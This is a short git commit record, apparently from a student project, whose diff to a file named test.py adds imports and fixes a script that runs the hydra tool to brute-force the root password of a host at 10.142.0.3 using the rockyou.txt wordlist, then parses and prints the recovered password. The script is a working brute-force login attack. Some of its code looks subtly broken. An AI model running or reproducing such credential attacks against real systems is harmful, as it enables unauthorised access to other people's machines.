e909eece3a49821ca30c01e702aef479576fac20
Ding Zhang <dzhang55@illinois.edu>
2019-02-24 03:07:45 -0600

    test

--- test.py
+++ test.py
@@ -1,4 +1,11 @@
-output = subprocess.Popen(["hydra -l root -P rockyou.txt -t 4 10.142.0.3"], stdout = PIPE)
+from pexpect import pxssh
+import subprocess
+import numpy as np
+import re
+import get_lan_ip
+import getpass
+
+output = subprocess.Popen(["hydra -l root -P rockyou.txt -t 4 10.142.0.3"], stdout = subprocess.PIPE)
 response = output.communicate()
 password = response.split("password: ", 1)[1]
 print("password is "+ password)
